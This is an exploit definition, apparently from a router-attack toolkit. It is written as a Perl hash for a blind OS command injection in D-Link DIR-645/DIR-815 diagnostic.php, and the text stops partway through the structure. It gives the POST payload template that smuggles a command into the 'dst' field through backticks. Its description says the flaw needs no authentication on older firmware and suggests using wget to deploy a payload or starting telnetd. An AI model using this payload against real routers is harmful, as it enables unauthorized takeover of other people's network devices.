my $EXPLOIT = {
  DESCRIPTION => "

          Some D-Link Routers are vulnerable to OS Command injection in the web interface.

        On DIR-645 versions prior 1.03 authentication isn't needed to exploit it. On

        version 1.03 authentication is needed in order to trigger the vulnerability, which

        has been fixed definitely on version 1.04. Other D-Link products, like DIR-300 rev B

        and DIR-600, are also affected by this vulnerability. Not every device includes

        wget which we need for deploying our payload. On such devices you could use the cmd

        generic payload and try to start telnetd or execute other commands. Since it is a

        blind OS command injection vulnerability, there is no output for the executed

        command when using the cmd generic payload. A ping command against a controlled

        system could be used for testing purposes. This module has been tested successfully

        on DIR-645 prior to 1.03, where authentication isn't needed in order to exploit the

        vulnerability.

      ",
  METHOD      => "POST",
  MSF_MODULE  => "dlink_diagnostic_exec_noauth",
  OSVDB       => 92144,
  PAYLOAD     => "act=ping&dst=`__CMD__`&",
  REFERENCES  => ["http://www.s3cur1ty.de/m1adv2013-017"],
  TITLE       => "D-Link DIR-645 / DIR-815 diagnostic.php Command Execution",
  VARIABLES => {
    'CMD' =>       { DESCRIPTION => "", VALUE => "" },
  },
